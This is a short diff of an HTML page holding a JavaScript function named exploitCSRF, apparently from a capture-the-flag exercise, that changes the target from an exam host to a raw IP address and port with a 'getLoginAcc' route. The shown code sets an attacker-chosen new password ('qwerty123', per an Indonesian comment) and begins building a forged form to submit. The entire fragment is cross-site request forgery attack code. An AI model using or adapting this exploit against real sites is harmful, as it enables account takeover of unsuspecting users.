@@ -15,7 +15,7 @@
 
     <script type="text/javascript">
         function exploitCSRF() {
-            var url = "http://exam.merdekasiber.com:24673/api/routes/api.php?route=login";
+            var url = "http://82.197.68.85:38259/api/routes/api.php?route=getLoginAcc";
             var newPass = "qwerty123"; // password baru dari penyerang
 
             var form = document.createElement('form');
